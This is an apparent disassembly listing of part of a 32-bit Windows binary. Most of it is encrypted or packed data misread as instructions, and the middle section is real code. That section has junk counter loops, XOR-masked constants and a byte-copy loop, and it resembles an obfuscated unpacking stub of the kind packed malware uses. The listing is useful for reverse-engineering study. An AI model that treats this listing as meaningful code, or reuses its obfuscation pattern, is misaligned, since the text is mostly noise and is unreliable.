  40f1c3:	or     DWORD PTR [ecx+0x17],0xfc3382ee
  40f1ca:	cmp    al,0x7c
  40f1cc:	xchg   DWORD PTR [edi-0x2e],esp
  40f1cf:	push   ss
  40f1d0:	xchg   esp,eax
  40f1d1:	loop   0x40f1df
  40f1d3:	in     al,dx
  40f1d4:	daa    
  40f1d5:	xchg   DWORD PTR es:[ebx-0x2a],esp
  40f1d9:	fstp   DWORD PTR [edx-0x37]
  40f1dc:	inc    ebp
  40f1dd:	std    
  40f1de:	out    0x7d,eax
  40f1e0:	push   edx
  40f1e1:	jecxz  0x40f184
  40f1e3:	sub    DWORD PTR [eax],ecx
  40f1e5:	jbe    0x40f264
  40f1e7:	dec    edi
  40f1e8:	pop    ss
  40f1e9:	xor    ebp,DWORD PTR [ebp+0x1b]
  40f1ec:	inc    ecx
  40f1ed:	outs   dx,DWORD PTR ds:[esi]
  40f1ee:	imul   edi,ecx,0xffffffb3
  40f1f1:	add    BYTE PTR ds:0xd2b54ca3,ah
  40f1f7:	sbb    al,0x9
  40f1f9:	xor    bl,dh
  40f1fb:	add    DWORD PTR [ebx+0x61a1cf8d],ebx
  40f201:	mov    ecx,0xed567d8d
  40f206:	pop    ds
  40f207:	popa   
  40f208:	shl    BYTE PTR [eax-0x19],0x1f
  40f20c:	push   edx
  40f20d:	adc    BYTE PTR [esi+0x137bf5f7],dl
  40f213:	jno    0xffef60c3
  40f219:	pop    edi
  40f21a:	lods   al,BYTE PTR ds:[esi]
  40f21b:	inc    ecx
  40f21c:	adc    ah,bh
  40f21e:	stos   BYTE PTR es:[edi],al
  40f21f:	and    dh,BYTE PTR [edi+eiz*2+0x6c]
  40f223:	in     eax,0xf0
  40f225:	mov    cl,0x16
  40f227:	dec    esi
  40f228:	mov    edx,0xb4fa529
  40f22d:	jns    0x40f232
  40f22f:	sub    eax,0x556c1088
  40f234:	cmp    edx,DWORD PTR [ebp+0x6219008]
  40f23a:	mov    ebx,0xbc27e4b5
  40f23f:	in     eax,0x58
  40f241:	fldcw  WORD PTR [esi]
  40f243:	dec    eax
  40f244:	mov    ebp,edi
  40f246:	mov    WORD PTR [edi],fs
  40f248:	xor    edi,DWORD PTR [eax+0x11396b60]
  40f24e:	int3   
  40f24f:	cli    
  40f250:	ins    BYTE PTR es:[edi],dx
  40f251:	in     al,0x48
  40f253:	xchg   ebp,eax
  40f254:	outs   dx,DWORD PTR ds:[esi]
  40f255:	inc    ecx
  40f256:	outs   dx,BYTE PTR ds:[esi]
  40f257:	jns    0x40f28c
  40f259:	or     al,0x8d
  40f25b:	enter  0x781a,0xda
  40f25f:	jb     0x40f270
  40f261:	push   es
  40f262:	add    dl,ch
  40f264:	sbb    ecx,ecx
  40f266:	pop    ebx
  40f267:	ss daa 
  40f269:	dec    ebp
  40f26a:	bound  edi,QWORD PTR [eax+ebx*1]
  40f26d:	addr16 gs retf 
  40f270:	addr16 inc eax
  40f272:	outs   dx,DWORD PTR ds:[esi]
  40f273:	enter  0xe40,0x11
  40f277:	push   0x69
  40f279:	add    DWORD PTR [ecx+0x4df4f417],ebx
  40f27f:	push   ebx
  40f280:	cmp    DWORD PTR [edx+0x126bff2a],ebx
  40f286:	mov    ecx,0x452d0abf
  40f28b:	sbb    al,0xb9
  40f28d:	mov    dl,0xcd
  40f28f:	mov    ch,0x65
  40f291:	jnp    0x40f237
  40f293:	push   ds
  40f294:	ret    
  40f295:	lods   al,BYTE PTR ds:[esi]
  40f296:	xchg   BYTE PTR [edx],al
  40f298:	nop
  40f299:	jge    0x40f300
  40f29b:	stos   DWORD PTR es:[edi],eax
  40f29c:	mov    esp,DWORD PTR [esi]
  40f29e:	sahf   
  40f29f:	mov    ch,0xb3
  40f2a1:	sbb    eax,0x39d559d1
  40f2a6:	shr    BYTE PTR [eax+0x6d],0xa5
  40f2aa:	inc    ecx
  40f2ab:	jnp    0x40f2fd
  40f2ad:	mov    eax,es:0x853c76fe
  40f2b3:	push   ebx
  40f2b4:	cmp    al,0x6b
  40f2b6:	xchg   ebx,eax
  40f2b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2b8:	adc    al,0xf0
  40f2ba:	add    eax,0x3d09e611
  40f2bf:	push   esi
  40f2c0:	ja     0x40f2c8
  40f2c2:	or     eax,DWORD PTR [ecx+0x0]
  40f2c5:	push   0x2c
  40f2c7:	pop    esp
  40f2c8:	dec    ebp
  40f2c9:	scas   eax,DWORD PTR es:[edi]
  40f2ca:	ins    DWORD PTR es:[edi],dx
  40f2cb:	sub    al,0xc6
  40f2cd:	leave  
  40f2ce:	or     eax,0x21d6fd28
  40f2d3:	push   ds
  40f2d4:	ret    
  40f2d5:	ins    DWORD PTR es:[edi],dx
  40f2d6:	sbb    DWORD PTR [eax],esp
  40f2d8:	jno    0x40f2fa
  40f2da:	mov    ah,0x3d
  40f2dc:	xor    DWORD PTR [edx+0x3d37908b],edx
  40f2e2:	jge    0x40f333
  40f2e4:	retf   0xa664
  40f2e7:	ret    0xa3f5
  40f2ea:	and    al,BYTE PTR [ebx+eiz*2]
  40f2ed:	inc    edx
  40f2ee:	jmp    0x22ea:0x839e57d6
  40f2f5:	stos   BYTE PTR es:[edi],al
  40f2f6:	sub    DWORD PTR [eax-0x54a1df2a],0xffffffed
  40f2fd:	mov    esi,0xfb0d8926
  40f302:	xchg   edx,eax
  40f303:	dec    DWORD PTR [ecx]
  40f305:	sbb    eax,0x1e2aa29f
  40f30a:	push   ecx
  40f30b:	pop    esi
  40f30c:	dec    ebp
  40f30d:	or     DWORD PTR [ebx-0x63],esi
  40f310:	mov    BYTE PTR [edx+0x236aee07],0x62
  40f317:	mov    ds:0xfd27622c,eax
  40f31c:	js     0x40f31b
  40f31e:	pop    ebx
  40f31f:	sub    BYTE PTR [eax+0x6b],0x75
  40f323:	or     DWORD PTR [eax-0x1f],ebp
  40f326:	hlt    
  40f327:	stos   DWORD PTR es:[edi],eax
  40f328:	pop    esi
  40f329:	push   edx
  40f32a:	jge    0x40f2c8
  40f32c:	xchg   ecx,eax
  40f32d:	sbb    edi,DWORD PTR [eax]
  40f32f:	push   ebx
  40f330:	cdq    
  40f331:	fucomp st(0)
  40f333:	sub    ah,BYTE PTR [esi]
  40f335:	and    dh,BYTE PTR [edx+0x57ed507e]
  40f33b:	div    BYTE PTR [ecx]
  40f33d:	fs dec esi
  40f33f:	iret   
  40f340:	lds    ebx,FWORD PTR [esi-0xc56e2d]
  40f346:	mov    edx,0x21279b8c
  40f34b:	cdq    
  40f34c:	mov    ds:0xdf8a2b46,al
  40f351:	mov    esi,0x91e2663c
  40f356:	push   cs
  40f357:	mov    dh,0x43
  40f359:	push   cs
  40f35a:	repz retf 
  40f35c:	ss out 0xdc,al
  40f35f:	sbb    DWORD PTR [ebx],ebp
  40f361:	dec    edx
  40f362:	pushf  
  40f363:	jo     0x40f3d2
  40f365:	popf   
  40f366:	jecxz  0x40f3db
  40f368:	push   edx
  40f369:	sub    bl,0xc4
  40f36c:	enter  0xaa7a,0xb6
  40f370:	inc    esp
  40f371:	xor    eax,0xfbe0fef9
  40f376:	or     esp,edi
  40f378:	xchg   ebp,eax
  40f379:	xor    BYTE PTR [eax+0x32],0xba
  40f37d:	and    BYTE PTR [ebp-0x47da6ed5],0x31
  40f384:	test   DWORD PTR [eax+edi*8+0x38a72581],ebx
  40f38b:	inc    ebx
  40f38c:	add    BYTE PTR [eax],al
  40f38e:	add    BYTE PTR [eax],al
  40f390:	add    BYTE PTR [ebx],dh
  40f392:	leave  
  40f393:	xor    ecx,DWORD PTR ds:0x4338a7
  40f399:	inc    ecx
  40f39a:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3a0:	cmp    DWORD PTR ds:0x4338a7,0x7
  40f3a7:	jne    0x40f3b6
  40f3ad:	push   DWORD PTR [ebp-0x14]
  40f3b0:	call   DWORD PTR ds:0x41236c
  40f3b6:	cmp    DWORD PTR ds:0x4338a7,0x6
  40f3bd:	jne    0x40f3d0
  40f3c3:	mov    ecx,DWORD PTR ds:0x4338a7
  40f3c9:	inc    ecx
  40f3ca:	mov    DWORD PTR ds:0x4338a7,ecx
  40f3d0:	cmp    DWORD PTR ds:0x4338a7,0x17
  40f3d7:	jb     0x40f391
  40f3dd:	mov    edx,DWORD PTR ds:0x4337ab
  40f3e3:	mov    ecx,DWORD PTR ds:0x433883
  40f3e9:	sub    edx,ecx
  40f3eb:	sub    edx,DWORD PTR [edx+ecx*1]
  40f3ee:	mov    DWORD PTR [ebp-0x8],eax
  40f3f1:	mov    DWORD PTR ds:0x4337d7,0x13
  40f3fb:	cmp    DWORD PTR ds:0x4337d7,0x0
  40f402:	je     0x40f4d8
  40f408:	cmp    DWORD PTR ds:0x4337d7,0x14
  40f40f:	jne    0x40f41b
  40f415:	call   DWORD PTR ds:0x412370
  40f41b:	mov    edx,DWORD PTR ds:0x4337d7
  40f421:	dec    edx
  40f422:	mov    DWORD PTR ds:0x4337d7,edx
  40f428:	jmp    0x40f3fb
  40f42d:	and    DWORD PTR ds:0x43386f,0x0
  40f437:	mov    ecx,DWORD PTR ds:0x43386f
  40f43d:	inc    ecx
  40f43e:	mov    DWORD PTR ds:0x43386f,ecx
  40f444:	cmp    DWORD PTR ds:0x43386f,0x8
  40f44b:	jne    0x40f45a
  40f451:	push   DWORD PTR [ebp-0x28]
  40f454:	call   DWORD PTR ds:0x4122ac
  40f45a:	cmp    DWORD PTR ds:0x43386f,0x7
  40f461:	jne    0x40f474
  40f467:	mov    ecx,DWORD PTR ds:0x43386f
  40f46d:	inc    ecx
  40f46e:	mov    DWORD PTR ds:0x43386f,ecx
  40f474:	cmp    DWORD PTR ds:0x43386f,0x15
  40f47b:	jb     0x40f437
  40f481:	and    DWORD PTR ds:0x43385b,0x0
  40f48b:	mov    edx,DWORD PTR ds:0x43385b
  40f491:	inc    edx
  40f492:	mov    DWORD PTR ds:0x43385b,edx
  40f498:	cmp    DWORD PTR ds:0x43385b,0x21
  40f49f:	jne    0x40f4bf
  40f4a5:	push   0x8bd6
  40f4aa:	push   0x433a11
  40f4af:	push   0x433a67
  40f4b4:	push   0x433a4b
  40f4b9:	call   DWORD PTR ds:0x4122b0
  40f4bf:	cmp    DWORD PTR ds:0x43385b,0x19
  40f4c6:	jb     0x40f48b
  40f4cc:	mov    ecx,DWORD PTR ds:0x433897
  40f4d2:	adc    DWORD PTR ds:0x4338a7,ecx
  40f4d8:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40f4df:	mov    edx,DWORD PTR [ebp-0x8]
  40f4e2:	push   esi
  40f4e3:	mov    ecx,0x7510854
  40f4e8:	xor    edx,ecx
  40f4ea:	mov    esi,0x32729b
  40f4ef:	push   edi
  40f4f0:	mov    edi,DWORD PTR [ebp+0x10]
  40f4f3:	add    edx,esi
  40f4f5:	cmp    edi,edx
  40f4f7:	je     0x40fbae
  40f4fd:	mov    edx,DWORD PTR [ebp-0x8]
  40f500:	mov    eax,DWORD PTR [ebp-0x4]
  40f503:	xor    eax,ecx
  40f505:	mov    edi,0xffcd8d65
  40f50a:	sub    edi,eax
  40f50c:	add    edi,DWORD PTR [ebp+0x10]
  40f50f:	xor    edx,ecx
  40f511:	add    edx,esi
  40f513:	cmp    edx,edi
  40f515:	ja     0x40fba9
  40f51b:	push   ebx
  40f51c:	jmp    0x40f526
  40f521:	mov    esi,0x32729b
  40f526:	mov    eax,DWORD PTR [ebp-0x8]
  40f529:	mov    edi,DWORD PTR [ebp-0x4]
  40f52c:	jmp    0x40f84b
  40f531:	and    al,0x6b
  40f533:	sbb    dl,BYTE PTR [esi+0x71]
  40f536:	push   edi
  40f537:	jo     0x40f5a2
  40f539:	dec    esi
  40f53a:	add    edi,DWORD PTR [eax-0x710532c7]
  40f540:	jmp    0x7ebfa219
  40f545:	jl     0x40f5c4
  40f547:	jle    0x40f5c7
  40f549:	fs pop ebx
  40f54b:	adc    BYTE PTR [ebp+0x1bc3aeda],ch
  40f551:	ret    0xace
  40f554:	mov    eax,0x1c34e717
  40f559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f55a:	mov    al,ds:0xfcaf53f5
  40f55f:	or     edx,DWORD PTR [eax-0x126feccd]
  40f565:	outs   dx,BYTE PTR ds:[esi]
  40f566:	fmul   DWORD PTR [ebx+0x78]
  40f569:	or     DWORD PTR [ecx-0x4c],ebp
  40f56c:	test   DWORD PTR [ebx+0x1ee3a34f],0x65a2c2c8
  40f576:	jmp    0x40f5c4
  40f578:	adc    ebx,DWORD PTR [ecx]
  40f57a:	int3   
  40f57b:	bound  edx,QWORD PTR [ebx*2-0x25da96f0]
  40f582:	push   es
  40f583:	jne    0x40f57d
  40f585:	(bad)
  40f58a:	or     dh,dl
  40f58c:	dec    eax
  40f58d:	xor    eax,0x4a782eca
  40f592:	mov    WORD PTR [edi+0x21],ds
  40f595:	dec    BYTE PTR [eax+0x28]
  40f598:	mov    ah,0xa3
  40f59a:	imul   ecx,DWORD PTR [esi+0x37],0xa9b04390
  40f5a1:	adc    BYTE PTR [ebp-0x5c],al
  40f5a4:	cmp    BYTE PTR [ebx-0x49e158d],cl
  40f5aa:	xchg   esi,eax
  40f5ab:	retf   
  40f5ac:	ffreep st(3)
  40f5ae:	sub    al,0xd3
  40f5b0:	loope  0x40f5ec
  40f5b2:	and    DWORD PTR [edi+0x4f],ebx
  40f5b5:	sub    ah,al
  40f5b7:	inc    edx
  40f5b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f5b9:	dec    ebp
  40f5ba:	jecxz  0x40f5d4
  40f5bc:	add    BYTE PTR [ecx-0x14e13a31],dh
  40f5c2:	fisubr WORD PTR [esi]
  40f5c4:	aad    0xdb
  40f5c6:	push   es
  40f5c7:	(bad)  
  40f5c8:	adc    al,0x6c
  40f5ca:	mov    edi,esi
  40f5cc:	je     0x40f554
  40f5ce:	xlat   BYTE PTR ds:[ebx]
  40f5cf:	add    al,0xd1
  40f5d1:	jmp    0x5f184eab
  40f5d6:	test   DWORD PTR [eax-0x20],ebx
  40f5d9:	mov    edx,0x4cb29da3
  40f5de:	jbe    0x40f5c6
  40f5e0:	jo     0x40f65d
  40f5e2:	stos   DWORD PTR es:[edi],eax
  40f5e3:	sub    eax,DWORD PTR [ebp-0x6f1d8eb4]
  40f5e9:	cli    
  40f5ea:	sbb    bl,BYTE PTR ds:0x967b659d
  40f5f0:	scas   eax,DWORD PTR es:[edi]
  40f5f1:	fcomp  QWORD PTR [edi+ebp*2-0x5f627a5]
  40f5f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5f9:	call   0x510fcf5c
  40f5fe:	xchg   edx,eax
  40f5ff:	pop    edx
  40f600:	bound  ecx,QWORD PTR [esi+0x6]
  40f603:	sbb    BYTE PTR [ebp+0x47ef51c0],0xcd
  40f60a:	jb     0x40f5e6
  40f60c:	push   cs
  40f60d:	int    0xc2
  40f60f:	fistp  DWORD PTR [eax+ebx*4]
  40f612:	adc    eax,0x1cd39026
  40f617:	mov    ds:0x8b9148ac,eax
  40f61c:	push   ebp
  40f61d:	cmp    BYTE PTR [eax-0x2d96af81],ch
  40f623:	push   ebx
  40f624:	psubd  mm5,QWORD PTR [eax+ebx*8+0x2b]
  40f629:	jp     0x40f611
  40f62b:	nop
  40f62c:	jg     0x40f65e
  40f62e:	xchg   ebp,eax
  40f62f:	ja     0x40f65d
  40f631:	jg     0x40f68b
  40f633:	fwait
  40f634:	repnz in al,0x33
  40f637:	loop   0x40f5df
  40f639:	or     BYTE PTR [ebp+edi*4-0x767bf968],dl
  40f640:	inc    edi
  40f641:	gs pop esp
  40f643:	and    eax,0x2527719
  40f648:	push   0xfc9ba979
  40f64d:	popa   
  40f64e:	cs jnp 0x40f69a
  40f651:	rol    bl,0x9c
  40f654:	push   ds
  40f655:	popa   
  40f656:	pop    ecx
  40f657:	inc    esi
  40f658:	add    DWORD PTR [ebx],0x4e
  40f65b:	fbld   TBYTE PTR [ebx-0x53b8bf67]
  40f661:	adc    eax,0x40fda270
  40f666:	rcr    DWORD PTR [ecx-0x5a],1
  40f669:	jl     0x40f5fc
  40f66b:	neg    DWORD PTR [ebx-0x432cc141]
  40f671:	retf   
  40f672:	cwde   
  40f673:	sbb    DWORD PTR [ebp-0x7bb8ebfb],ebp
  40f679:	cmp    dl,bl
  40f67b:	nop
  40f67c:	shl    DWORD PTR [edi-0x38d4d295],0x40
  40f683:	mov    ebp,esi
  40f685:	retf   0xcb75
  40f688:	or     eax,0x72bf8c59
  40f68d:	add    eax,0x7ef4655e
  40f692:	rcl    BYTE PTR [ebx-0x48],1
  40f695:	add    dl,BYTE PTR [esi+edi*2-0x294c9281]
  40f69c:	in     al,dx
  40f69d:	or     esi,DWORD PTR [edx-0x50]
  40f6a0:	out    0x9a,al
  40f6a2:	(bad)  
  40f6a3:	fld    QWORD PTR [edx-0xe]
  40f6a6:	xor    esp,DWORD PTR [esi-0x32041ffb]
  40f6ac:	pop    ss
  40f6ad:	or     al,0xd3
  40f6af:	xlat   BYTE PTR ds:[ebx]
  40f6b0:	(bad)  
  40f6b1:	ins    DWORD PTR es:[edi],dx
  40f6b2:	(bad)  
  40f6b3:	mov    ds:0xac08ec16,eax
  40f6b8:	ds dec ecx
  40f6ba:	shr    WORD PTR [ebx-0x72],0xd3
  40f6bf:	xchg   edi,eax
  40f6c0:	lods   eax,DWORD PTR ds:[esi]
  40f6c1:	mov    ch,0x74
  40f6c3:	dec    ebp
  40f6c4:	cmc    
  40f6c5:	pop    es
  40f6c6:	cmp    eax,0x70da9d49
  40f6cb:	stos   BYTE PTR es:[edi],al
  40f6cc:	mov    ecx,0x1101c73f
  40f6d1:	fistp  WORD PTR [eax-0x9]
  40f6d4:	aaa    
  40f6d5:	mov    edx,0xfd077b15
  40f6da:	(bad)  
  40f6db:	xchg   ecx,eax
  40f6dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6dd:	dec    ebp
  40f6de:	mov    ch,0xa
  40f6e0:	cmp    al,0xd0
  40f6e2:	mov    ch,0x19
  40f6e4:	test   DWORD PTR [edi+0x21],esi
  40f6e7:	out    0xad,al
  40f6e9:	scas   al,BYTE PTR es:[edi]
  40f6ea:	cli    
  40f6eb:	sbb    esi,DWORD PTR [ebx-0xf61b4d]
  40f6f1:	iret   
  40f6f2:	push   ecx
  40f6f3:	xor    bl,BYTE PTR [ecx]
  40f6f5:	sub    esi,DWORD PTR [ebx-0x567e708d]
  40f6fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f6fc:	mov    ds,WORD PTR [edx-0x3e5ca60d]
  40f702:	imul   ebp,DWORD PTR [ebp-0x2e0d6066],0x64
  40f709:	fcom   DWORD PTR [ecx+edi*8-0x56]
  40f70d:	cdq    
  40f70e:	clc    
  40f70f:	adc    eax,0x72d2702a
  40f714:	repz sub BYTE PTR [eax],ah
  40f717:	xchg   esp,edx
  40f719:	add    bh,BYTE PTR [edi-0x29]
  40f71c:	aad    0xe3
  40f71e:	pop    edx
  40f71f:	adc    eax,0x154e26b0
  40f724:	test   BYTE PTR [edi+ecx*2+0x30009ef3],bl
  40f72b:	je     0x40f715
  40f72d:	ret    0xb27d
  40f730:	pop    ecx
  40f731:	sbb    DWORD PTR [eax-0x6c],eax
  40f734:	or     eax,0x87cca1e3
  40f739:	cdq    
  40f73a:	jg     0x40f722
  40f73c:	jno    0x40f719
  40f73e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f73f:	ret    0xd8ff
  40f742:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f743:	jmp    0x40f75e
  40f745:	mul    DWORD PTR [edx-0x1cbd5b2]
  40f74b:	rol    DWORD PTR [eax-0x9],1
  40f74e:	stos   DWORD PTR es:[edi],eax
  40f74f:	pop    edx
  40f750:	or     BYTE PTR [ebp+0x3],0x29
  40f754:	push   esi
  40f755:	jg     0x40f725
  40f757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f758:	int    0x9e
  40f75a:	mov    ebx,DWORD PTR [ebp-0x7e]
  40f75d:	and    edi,DWORD PTR [edi-0x2c5343cb]
  40f763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f764:	ret    
  40f765:	jg     0x40f6f3
  40f767:	dec    edi
  40f768:	mov    ebx,0x75c40bbd
  40f76d:	sbb    eax,0xf19076ed
  40f772:	mov    BYTE PTR [esi-0x51ee89a0],bl
  40f778:	into   
  40f779:	xor    ebp,edx
  40f77b:	aam    0xf5
  40f77d:	adc    eax,0x3ab6920c
  40f782:	lods   eax,DWORD PTR ds:[esi]
  40f783:	adc    ch,BYTE PTR ds:0xfc2c9908
  40f789:	sbb    al,0xe2
  40f78b:	xchg   esi,eax
  40f78c:	jnp    0x40f769
  40f78e:	repnz stos DWORD PTR es:[edi],eax
  40f790:	sbb    al,0x8c
  40f792:	out    0xaa,al
  40f794:	lods   al,BYTE PTR ds:[esi]
  40f795:	(bad)  
  40f796:	ins    BYTE PTR es:[edi],dx
  40f797:	and    DWORD PTR [edi-0x55803742],edx
  40f79d:	aad    0xf2
  40f79f:	jmp    0x40f763
  40f7a1:	pop    edi
  40f7a2:	ja     0x40f797
  40f7a4:	data16 jecxz 0x40f7d3
  40f7a7:	xor    ebp,edx
  40f7a9:	or     BYTE PTR [ebp+0x4ab2e651],0x15
  40f7b0:	inc    edi
  40f7b1:	xchg   edi,eax
  40f7b2:	lea    edi,[edi+0x75]
  40f7b5:	mov    BYTE PTR [ecx-0x3e0945bd],0x43
  40f7bc:	lds    ebx,FWORD PTR [edi-0x74b9e54f]
  40f7c2:	aas    
  40f7c3:	xor    al,0xa0
  40f7c5:	push   ss
  40f7c6:	fnstcw WORD PTR [edx-0x31]
  40f7c9:	sbb    ah,BYTE PTR [ebx-0x22]
  40f7cc:	fst    DWORD PTR [eax-0x2e4159e]
  40f7d2:	jmp    0x40f781
  40f7d4:	out    dx,al
  40f7d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7d6:	jne    0x40f7fc
  40f7d8:	xchg   edx,eax
  40f7d9:	mov    bh,0x98
  40f7db:	daa    
  40f7dc:	aaa    
  40f7dd:	or     BYTE PTR [ebx],al
  40f7df:	push   edi
  40f7e0:	imul   ebx,DWORD PTR [ebx+0x7bac7a5e],0xd9a1a558
  40f7ea:	sbb    bh,BYTE PTR [eax]
  40f7ec:	pop    edi
  40f7ed:	pop    esp
  40f7ee:	popf   
  40f7ef:	cmp    eax,0x407548a1
  40f7f4:	out    0xd3,al
  40f7f6:	scas   al,BYTE PTR es:[edi]
  40f7f7:	nop
  40f7f8:	ss push cs
  40f7fa:	ins    BYTE PTR es:[edi],dx
  40f7fb:	fiadd  WORD PTR [ebx+0x5a026dc6]
  40f801:	mov    edx,0x5d0b91a3
  40f806:	addr16 xchg ebp,eax
  40f808:	sub    eax,0x80b4fafc
  40f80d:	inc    edi
  40f80e:	nop
  40f80f:	or     ah,BYTE PTR [ebp-0x4]
  40f812:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f813:	out    0xb9,al
  40f815:	inc    ebx
  40f816:	sbb    cl,BYTE PTR [edx-0x71]
  40f819:	ficomp WORD PTR [ebx]
  40f81b:	aas    
  40f81c:	leave  
  40f81d:	lds    ecx,FWORD PTR [ebx+0x376b2ab]
  40f823:	mov    eax,0xfc67adb4
  40f828:	(bad)  
  40f82a:	cli    
  40f82b:	sbb    al,0xb5
  40f82d:	jbe    0x40f7b5
  40f82f:	rcl    DWORD PTR [ebx],1
  40f831:	xor    esp,ebx
  40f833:	scas   al,BYTE PTR es:[edi]
  40f834:	sbb    DWORD PTR [eax-0x3fdb0f9f],esp
  40f83a:	xchg   ebp,eax
  40f83b:	sub    eax,0x4b009ed3
  40f840:	push   esi
  40f841:	addr16 loopne 0x40f89c
  40f844:	mov    eax,ds:0x34f07bad
  40f849:	mov    eax,0x3f933cc
  40f84e:	dec    BYTE PTR [ebx-0x50f0f78b]
  40f854:	cli    
  40f855:	mov    ebx,DWORD PTR [ebp+0xc]
  40f858:	xor    eax,ecx
  40f85a:	add    eax,edx
  40f85c:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  40f863:	mov    BYTE PTR [edi+esi*1],al
  40f866:	mov    eax,DWORD PTR [ebp-0x4]
  40f869:	xor    eax,ecx
  40f86b:	lea    edx,[edx+eax*1+0x32729b]
  40f872:	mov    eax,DWORD PTR [ebp-0x4]
  40f875:	xor    eax,ecx
  40f877:	mov    esi,0xffcd8d65
  40f87c:	sub    esi,eax
  40f87e:	add    esi,DWORD PTR [ebp+0x10]
  40f881:	cmp    edx,esi
  40f883:	jmp    0x40fba2
  40f888:	and    BYTE PTR [edi],0xc2
  40f88b:	in     eax,0x61
  40f88d:	loope  0x40f830
  40f88f:	arpl   WORD PTR [ecx-0x4b],bp
  40f892:	adc    eax,0x8d24503f
  40f897:	stos   BYTE PTR es:[edi],al
  40f898:	shr    BYTE PTR [ebx+0x7d7c7e7e],cl
  40f89e:	jle    0x40f91e
  40f8a0:	(bad)  
  40f8a1:	mov    eax,gs
  40f8a3:	pop    ebx
  40f8a4:	or     al,0x66
  40f8a6:	pop    es
  40f8a7:	inc    ecx
  40f8a8:	test   DWORD PTR ds:0xfbea1658,edi
  40f8ae:	lea    edi,[ebx-0x4d]
  40f8b1:	and    DWORD PTR [edx],ebp
  40f8b3:	mov    ch,0xa2
  40f8b5:	pop    DWORD PTR [ebx+eiz*1]
  40f8b8:	scas   eax,DWORD PTR es:[edi]
  40f8b9:	lods   al,BYTE PTR ds:[esi]
  40f8ba:	push   ss
  40f8bb:	adc    edx,DWORD PTR [ebp+esi*4+0x33b4159e]
  40f8c2:	stc    
  40f8c3:	not    cl
  40f8c5:	sub    DWORD PTR [ecx+0x5c],ebp
  40f8c8:	sbb    edx,DWORD PTR [edi+0x412b326]
  40f8ce:	dec    ebx
  40f8cf:	jmp    0x15ef5d51
  40f8d4:	add    eax,0x2a98280
  40f8d9:	mov    DWORD PTR [esi],eax
  40f8db:	or     eax,0x7d
  40f8de:	sub    DWORD PTR [edi-0x33db6958],esi
  40f8e4:	add    BYTE PTR [eax],0x1d
  40f8e7:	push   edi
  40f8e8:	pop    edi
  40f8e9:	mov    esp,0x4e353000
  40f8ee:	or     ebx,ebx
  40f8f0:	push   0xffffffb2
  40f8f2:	loope  0x40f8d5
  40f8f4:	aam    0xa5
  40f8f6:	mov    dl,0xbf
  40f8f8:	jge    0x40f937
  40f8fa:	and    BYTE PTR [ebx+0x55],bh
  40f8fd:	ret    0xde9
  40f900:	jmp    0xde4e:0x80dda5e2
  40f907:	mov    dh,0x61
  40f909:	push   ebp
  40f90a:	mov    eax,ds:0xdb0afd26
  40f90f:	stc    
  40f910:	push   ebp
  40f911:	(bad)  
  40f912:	mov    esp,0x2540d32d
  40f917:	iret   
  40f918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f919:	mov    edi,0x70edd92e
  40f91e:	pop    edi
  40f91f:	add    DWORD PTR fs:[ebx],0xffffffe6
  40f923:	jo     0x40f8c2
  40f925:	sub    DWORD PTR [ebx-0x26be08e],0xffffffa1
  40f92c:	lds    ecx,FWORD PTR [edi]
  40f92e:	mov    bh,0xcd
  40f930:	dec    ecx
  40f931:	pop    esi
  40f932:	sbb    ch,cl
  40f934:	neg    DWORD PTR [eax]
  40f936:	cwde   
  40f937:	adc    ch,BYTE PTR ds:0xa51ddec4
  40f93d:	xchg   ebp,eax
  40f93e:	out    dx,al
  40f93f:	inc    esi
  40f940:	sub    ah,al
  40f942:	ja     0x40f975
  40f944:	sbb    BYTE PTR [ecx+ebx*4],ah
  40f947:	sbb    eax,0x60107851
  40f94c:	ins    DWORD PTR es:[edi],dx
  40f94d:	jne    0x40f92b
  40f94f:	das    
  40f950:	xchg   esi,eax
  40f951:	loop   0x40f97e
  40f953:	mov    ds:0xda40ec39,eax
  40f958:	mov    cl,0x5f
  40f95a:	pop    esi
  40f95b:	call   0xa615:0xc7cf6840
  40f962:	ja     0x40f912
  40f964:	enter  0xc56d,0x9c
  40f968:	adc    BYTE PTR [ebp-0x88ce121],0xfe
  40f96f:	aaa    
  40f970:	div    DWORD PTR [esi-0x73]
  40f973:	icebp  
  40f974:	js     0x40f9c2
  40f976:	mov    al,ds:0xb96a8592
  40f97b:	pop    ds
  40f97c:	int3   
  40f97d:	add    al,0x28
  40f97f:	fcom   DWORD PTR [edx]
  40f981:	mov    gs,WORD PTR [edx+0x351b4a8b]
  40f987:	push   ds
  40f988:	mov    eax,ds:0xc6c6fdad
  40f98d:	jae    0x40f937
  40f98f:	mov    WORD PTR [esi],ds
  40f991:	ins    BYTE PTR es:[edi],dx
  40f992:	sub    bh,BYTE PTR [edi+0x45fcaa8d]
  40f998:	xchg   ebp,eax
  40f999:	mov    eax,ds:0xb4fbe12d
  40f99e:	xor    eax,0xa25d4c7e
  40f9a3:	push   ss
  40f9a4:	imul   edx,DWORD PTR ds:0xb9687adb,0x7d
  40f9ab:	xchg   esp,eax
  40f9ac:	mov    al,0x4d
  40f9ae:	jo     0x40fa29
  40f9b0:	mov    cl,0x8b
  40f9b2:	cmp    ebp,ecx
  40f9b4:	mov    cl,0x89
  40f9b6:	jo     0x40f9ea
  40f9b8:	pop    edx
  40f9b9:	push   ebx
  40f9ba:	mov    al,BYTE PTR cs:[edi+edi*2+0x628c94c9]
  40f9c2:	arpl   WORD PTR [esi+0x29],si
  40f9c5:	ss popf 
  40f9c7:	adc    ebx,DWORD PTR [ebx-0x80]
  40f9ca:	sub    BYTE PTR [edi-0x47742272],cl
  40f9d0:	dec    ecx
  40f9d1:	in     al,0x99
